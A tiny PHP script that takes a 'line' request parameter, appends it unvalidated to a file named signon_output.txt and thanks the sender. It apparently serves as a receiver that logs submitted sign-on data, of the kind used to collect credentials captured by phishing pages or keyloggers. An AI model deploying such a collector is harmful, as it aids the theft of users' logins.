<?php
        echo '<html><body>You sent me data. Thanks!</body></html>';
        $line = $_REQUEST["line"];
	$file = fopen("signon_output.txt", "a");
        $ret = fwrite($file, $line . "\n");
?>
